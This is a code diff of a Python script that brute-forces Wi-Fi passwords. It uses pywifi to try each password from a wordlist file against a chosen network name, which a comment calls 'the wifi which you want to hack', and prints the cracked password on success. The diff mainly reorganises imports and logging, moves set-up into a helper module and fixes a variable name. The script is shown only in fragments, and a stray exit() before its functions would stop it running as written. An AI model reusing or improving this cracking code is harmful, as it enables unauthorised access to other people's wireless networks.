@@ -6,19 +6,22 @@
 ###############################################################################################################
 # Importing General Libraries
 import argparse
-import sys, os, os.path, platform
-import re
-import time
 import logging
+import os, os.path, platform
+import sys
+import time
 
 # Importing pywifi library
-import pywifi
-from pywifi import PyWiFi
 from pywifi import const
 from pywifi import Profile
 
-from colorama import init
-init()
+import colorama
+
+colorama.init()
+
+import wifi
+from const import *
+
 
 # Change According to needs -->
 # cient_ssid == name of the wifi which you want to hack
@@ -31,53 +34,20 @@ init()
 ################################################################################
 
 # noinspection PyArgumentList
-# logging.basicConfig(
-#     level=logging.NOTSET,
-#     format="%(levelname)s | %(message)s",
-#     stream=sys.stdout,
-#     force=True,
-# )
+logging.basicConfig(
+    level=logging.ERROR,
+    format="%(levelname)s | %(message)s",
+    stream=sys.stdout,
+    force=True,
+)
 # logging.getLogger('pywifi').setLevel(logging.NOTSET)
 
-# Setting the color combinations
-RED = "\033[1;31m"
-BLUE = "\033[1;34m"
-CYAN = "\033[1;36m"
-GREEN = "\033[0;32m"
-RESET = "\033[0;0m"
-BOLD = "\033[;1m"
-REVERSE = "\033[;7m"
 
-try:
-    print("[+] Initializing PyWifi:")
-    # Interface information
-    wifi = PyWiFi()
-    ifaces = wifi.interfaces()[0]  # for wifi we use index - 0
-    exit(0)
-
-    ifaces.scan()  # check the card
-    time.sleep(2)
-    results = ifaces.scan_results()  # Obtain the results of the previous triggerred scan. A Profile list will be returned.
-    for result in results:
-        print(result.ssid)
-
-    print(f"scan found {len(results)} networks")
-    # for result in results:
-    #     for var in vars(result):
-    #         print(f"{var:15}: {getattr(result, var)}")
-
-    wifi = pywifi.PyWiFi()  # A Profile is the settings of the AP we want to connect to
-    iface = wifi.interfaces()[0]
-
-    # exit(0)
-    print("[+] Init ok")
-except Exception as e:
-    print("[-] Init FAIL, Error system")
-    print(repr(e))
-    exit()
+wifi.initwifi()
 
 type = False
 exit()
+
 
 def main(ssid, password, number):
     profile = Profile()  # create profile instance
@@ -102,7 +72,7 @@ def main(ssid, password, number):
     iface.connect(tmp_profile)  # trying to Connect
     time.sleep(0.35)  # 1s
 
-    if ifaces.status() == const.IFACE_CONNECTED:  # checker
+    if iface.status() == const.IFACE_CONNECTED:  # checker
         time.sleep(1)
         print(BOLD, GREEN, '[*] Crack success!', RESET)
         print(BOLD, GREEN, '[*] password is ' + password, RESET)
@@ -152,10 +122,10 @@ def menu(client_ssid, path_to_file):
         # breaking
     if os.path.exists(filee):
         pass
-    #     if platform.system().startswith("Win" or "win"):
-    #         os.system("cls")
-    #     else:
-    #         os.system("clear")
+        #     if platform.system().startswith("Win" or "win"):
+        #         os.system("cls")
+        #     else:
+        #         os.system("clear")
 
         print(BLUE, "[~] Cracking...")
         pwd(ssid, filee)
